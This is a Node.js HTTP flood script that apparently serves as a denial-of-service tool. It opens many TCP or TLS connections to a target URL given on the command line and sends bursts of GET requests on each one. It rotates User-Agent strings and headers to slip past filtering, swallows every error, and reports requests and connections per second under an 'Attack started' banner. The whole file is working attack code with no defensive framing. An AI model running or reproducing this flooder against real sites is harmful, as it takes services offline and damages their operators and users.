const net = require('net');
const tls = require('tls');
const { URL } = require('url');
const { setTimeout: sleep } = require('timers/promises');

let pps = 0, cps = 0;

// Random User-Agent Generator
function randomUseragent() {
    const platforms = [
        "(Windows NT 10.0; Win64; x64)",
        "(iPhone; CPU iPhone OS 16_5 like Mac OS X)",
        "(Linux; Android 13; SM-S901B)"
    ];
    const browsers = [
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Gecko/20100101 Firefox/118.0"
    ];
    const randomPlatform = platforms[Math.floor(Math.random() * platforms.length)];
    const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    return `Mozilla/5.0 ${randomPlatform} ${randomBrowser}`;
}

// Random Header Generator
function randomHeaders() {
    const headers = [
        "Accept: text/html,application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br"
    ];
    return headers[Math.floor(Math.random() * headers.length)];
}

async function flooder(target, payload, event, rpc = 100) {
    await event.promise;
    while (!event.aborted) {
        try {
            const socket = target.protocol === 'https:'
                ? tls.connect(target.port || 443, target.hostname)
                : net.connect(target.port || 80, target.hostname);
            
            socket.on('error', () => {});
            socket.on('connect', () => {
                cps++;
                for (let i = 0; i < rpc; i++) {
                    // Dynamically generate unique payload per request
                    const dynamicPayload = (
                        `GET ${target.pathname || '/'}${target.search || ''} HTTP/1.1\r\n` +
                        `Host: ${target.host}\r\n` +
                        `User-Agent: ${randomUseragent()}\r\n` +
                        `${randomHeaders()}\r\n` +
                        "Connection: keep-alive\r\n" +
                        "\r\n"
                    );
                    socket.write(dynamicPayload);
                    pps++;
                }
            });
            
            await new Promise(resolve => socket.on('close', resolve));
        } catch (e) {
            // Suppress errors
        }
    }
}

async function main() {
    try {
        if (process.argv.length !== 6) {
            throw new Error(`Usage: node ${process.argv[1]} <target> <workers> <rpc> <timer>`);
        }

        const target = new URL(process.argv[2]);
        const workers = parseInt(process.argv[3]);
        const rpc = parseInt(process.argv[4]);
        const timer = parseInt(process.argv[5]);
        
        const event = {
            aborted: false,
            promise: null,
            resolve: null
        };
        event.promise = new Promise(resolve => { event.resolve = resolve; });

        // Original payload (unused due to dynamic generation)
        const payload = Buffer.alloc(0);
        
        for (let i = 0; i < workers; i++) {
            flooder(target, payload, event, rpc);
            await sleep(0);
        }
        
        event.resolve();
        console.log(`Attack started to ${target.href}`);

        const startTime = Date.now();
        const endTime = startTime + timer * 1000;
        
        while (Date.now() < endTime) {
            pps = 0;
            cps = 0;
            await sleep(1000);
            const timeLeft = Math.ceil((endTime - Date.now()) / 1000);
            console.log(`PPS: ${pps.toLocaleString()} | CPS: ${cps.toLocaleString()} | Time Left: ${timeLeft}s`);
        }
        
        event.aborted = true;
    } catch (e) {
        console.error(`Error: ${e.message}`);
    }
}

main();